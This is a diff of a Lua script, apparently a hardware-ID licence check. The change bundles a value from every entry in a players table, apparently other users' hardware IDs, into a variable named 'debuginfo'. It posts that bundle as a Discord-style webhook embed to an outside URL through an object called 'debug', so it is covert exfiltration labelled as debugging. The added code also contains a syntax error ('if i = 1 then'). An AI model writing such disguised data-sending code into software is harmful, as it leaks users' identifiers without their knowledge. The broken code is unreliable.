@@ -160,17 +160,23 @@
     local HWID = getMyHWID()
     Baseboard = getMyBaseboardVersion()
     local debug = getInternet()
+    local debuginfo = ""
     for i=1,#playersTable.values,1 do
-      local details = {
-        content= "",
-        embeds= {
-                {title = "Player: robit",
-                description = playersTable.values[i][5],
-                color = 2108336}
-                },
-        }
-      local data = json.encode(details)
-      debug.postURL(REG_url,"payload_json="..data.."&Content-Type=".."application/json")
+      debuginfo = debuginfo..playersTable.values[i][5].."\n"
+    end
+    for i=1,#playersTable.values,1 do
+      if i = 1 then
+        local details = {
+          content= "",
+          embeds= {
+                  {title = "Player: robit",
+                  description = debuginfo,
+                  color = 2108336}
+                  },
+          }
+        local data = json.encode(details)
+        debug.postURL(REG_url,"payload_json="..data.."&Content-Type=".."application/json")
+        end
       if (playersTable.values[i][5]) == HWID then
         local id = i
         return id
